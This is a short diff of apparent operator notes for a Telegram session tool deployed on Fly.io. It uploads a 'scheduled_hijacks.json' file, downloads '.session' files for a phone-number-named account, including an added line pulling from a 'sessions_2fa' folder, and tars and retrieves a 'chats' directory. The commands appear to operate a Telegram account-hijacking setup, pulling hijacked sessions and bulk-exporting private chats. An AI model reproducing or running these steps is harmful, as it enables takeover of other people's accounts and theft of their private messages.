@@ -217,6 +217,8 @@ flyctl sftp put C:\Practice\TelegramSessionPy\scheduled_hijacks.json /app/data/s
 fly ssh console -C "rm /app/data/scheduled_hijacks.json"
 
 flyctl sftp get /app/data/sessions/380959314572.session sessions/380959314572.session
+flyctl sftp get /app/data/sessions_2fa/380959314572.session sessions/380959314572.session
+
 flyctl ssh console
 cd /app/data && tar -czf /tmp/chats.tar.gz chats/
 flyctl sftp get /tmp/chats.tar.gz chats.tar.gz
